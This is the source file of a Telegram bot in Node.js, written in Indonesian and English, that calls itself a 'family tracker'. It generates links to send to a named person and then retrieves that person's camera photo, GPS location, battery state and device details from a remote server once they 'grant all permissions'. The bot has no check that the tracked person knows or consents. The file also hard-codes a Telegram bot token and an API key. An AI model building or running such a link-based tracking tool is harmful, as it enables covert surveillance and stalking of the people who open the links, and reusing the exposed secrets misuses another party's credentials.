const { Telegraf, Markup } = require('telegraf');
const axios = require('axios');
require('dotenv').config();

// --- Konfigurasi dari Environment Variables ---
const TELEGRAM_TOKEN = '6136209053:AAF01MfDjE9oIajSHIDBDTpJ70CUuTqQLpY';
const RENDER_SERVER_URL = 'https://svb.onrender.com';
const API_KEY = 'KucingTerbangWarnaWarni123!';

if (!TELEGRAM_TOKEN || !RENDER_SERVER_URL || !API_KEY) {
    console.error("FATAL ERROR: Pastikan TELEGRAM_TOKEN, RENDER_SERVER_URL, dan API_KEY sudah diatur!");
    process.exit(1);
}

const bot = new Telegraf(TELEGRAM_TOKEN);
const api = axios.create({
    baseURL: RENDER_SERVER_URL,
    headers: { 'X-API-KEY': API_KEY }
});

// --- Fungsi pilih bahasa ---
function t(ctx, idText, enText) {
    const lang = ctx.from.language_code;
    return (lang && lang.toLowerCase().startsWith('id')) ? idText : enText;
}

// --- Command Handlers ---

bot.command(['start', 'help'], (ctx) => {
    const helpText = t(
        ctx,
        `Halo ${ctx.from.first_name}!\n\nSaya adalah bot pelacak keluarga berbasis izin.\n\n*Perintah yang tersedia:*\n/buatlink <nama> - Membuat link pelacakan baru\n/listlink - Melihat semua link aktif\n/lacak <nama> - Mendapatkan data terakhir\n/hapuslink <nama> - Menghapus link`,
        `Hello ${ctx.from.first_name}!\n\nI am a permission-based family tracker bot.\n\n*Available commands:*\n/buatlink <name> - Create a new tracking link\n/listlink - View all active links\n/lacak <name> - Get the latest data\n/hapuslink <name> - Delete a link`
    );
    ctx.replyWithMarkdown(helpText);
});

bot.command('buatlink', async (ctx) => {
    const input = ctx.message.text.split(' ');
    if (input.length < 2) return ctx.reply(t(ctx, "Contoh: /buatlink Ayah", "Example: /buatlink Dad"));

    const alias = input[1];
    const userId = ctx.from.id.toString();

    try {
        const response = await api.post('/api/create_link', { user_id: userId, alias });
        const { link } = response.data;
        const pesan = t(
            ctx,
            `Link untuk *${alias}* berhasil dibuat!\n\nBerikan link ini:\n\`${link}\`\n\nPastikan mereka membuka link & menyetujui semua izin.`,
            `Link for *${alias}* created successfully!\n\nShare this link:\n\`${link}\`\n\nMake sure they open it & grant all permissions.`
        );
        ctx.reply(pesan, { parse_mode: 'Markdown' });
    } catch (error) {
        ctx.reply(t(ctx, `Gagal membuat link: ${error.response?.data?.message || error.message}`, `Failed to create link: ${error.response?.data?.message || error.message}`));
    }
});

bot.command('listlink', async (ctx) => {
    const userId = ctx.from.id.toString();
    try {
        const response = await api.get(`/api/list_links/${userId}`);
        const links = response.data.links;
        if (!links || links.length === 0) {
            return ctx.reply(t(ctx, "Anda belum memiliki link aktif.", "You have no active links."));
        }
        let pesan = t(ctx, "*Daftar Link Aktif Anda:*\n\n", "*Your Active Links:*\n\n");
        links.forEach(link => {
            const status = link.has_data
                ? t(ctx, '✅ (Ada Data)', '✅ (Has Data)')
                : t(ctx, '⏳ (Menunggu)', '⏳ (Waiting)');
            pesan += `*${link.alias}* ${status}\n\`${link.link}\`\n\n`;
        });
        ctx.replyWithMarkdown(pesan, { disable_web_page_preview: true });
    } catch (error) {
        ctx.reply(t(ctx, `Gagal mengambil daftar: ${error.response?.data?.message || error.message}`, `Failed to fetch list: ${error.response?.data?.message || error.message}`));
    }
});

bot.command('lacak', async (ctx) => {
    const input = ctx.message.text.split(' ');
    if (input.length < 2) return ctx.reply(t(ctx, "Contoh: /lacak Ayah", "Example: /lacak Dad"));

    const alias = input[1];
    const userId = ctx.from.id.toString();

    await ctx.reply(t(ctx, `Mencari data terakhir untuk *${alias}*...`, `Searching last data for *${alias}*...`), { parse_mode: 'Markdown' });

    try {
        const response = await api.get(`/api/get_data/${userId}/${alias}`);
        const { data } = response.data;

        // Foto
        if (data.photoBase64) {
            const photoBuffer = Buffer.from(data.photoBase64.replace(/^data:image\/jpeg;base64,/, ""), 'base64');
            await ctx.replyWithPhoto({ source: photoBuffer }, { caption: t(ctx, `Snapshot dari kamera ${alias}`, `Snapshot from ${alias}'s camera`) });
        } else {
            await ctx.reply(t(ctx, "Tidak ada data foto yang diterima.", "No photo data received."));
        }

        // Lokasi
        if (data.location) {
            await ctx.replyWithLocation(data.location.lat, data.location.lon);
        } else {
            await ctx.reply(t(ctx, "Tidak ada data lokasi yang diterima.", "No location data received."));
        }

        // Info perangkat
        if (data.deviceInfo) {
            const infoText = t(
                ctx,
                `*Laporan Teks untuk ${alias}*\n\nWaktu: ${new Date(data.timestamp).toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' })}\n\n*🔋 Baterai:*\nLevel: ${data.deviceInfo.battery?.level || 'N/A'}\nMengisi Daya: ${data.deviceInfo.battery?.isCharging ? 'Ya' : 'Tidak'}\n\n*💻 Perangkat:*\n${data.deviceInfo.userAgent}`,
                `*Text Report for ${alias}*\n\nTime: ${new Date(data.timestamp).toLocaleString('en-US', { timeZone: 'Asia/Jakarta' })}\n\n*🔋 Battery:*\nLevel: ${data.deviceInfo.battery?.level || 'N/A'}\nCharging: ${data.deviceInfo.battery?.isCharging ? 'Yes' : 'No'}\n\n*💻 Device:*\n${data.deviceInfo.userAgent}`
            );
            await ctx.replyWithMarkdown(infoText);
        }

    } catch (error) {
        ctx.reply(t(ctx, `Gagal melacak: ${error.response?.data?.message || "Data belum tersedia."}`, `Failed to track: ${error.response?.data?.message || "Data not available yet."}`));
    }
});

bot.command('hapuslink', async (ctx) => {
    const input = ctx.message.text.split(' ');
    if (input.length < 2) return ctx.reply(t(ctx, "Contoh: /hapuslink Ayah", "Example: /hapuslink Dad"));
    const alias = input[1];
    const userId = ctx.from.id.toString();
    try {
        const response = await api.post('/api/delete_link', { user_id: userId, alias });
        ctx.reply(response.data.message);
    } catch (error) {
        ctx.reply(t(ctx, `Gagal menghapus: ${error.response?.data?.message || error.message}`, `Failed to delete: ${error.response?.data?.message || error.message}`));
    }
});

// --- Jalankan Bot ---
bot.launch();
console.log('Bot Telegraf multi-bahasa sedang berjalan...');

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
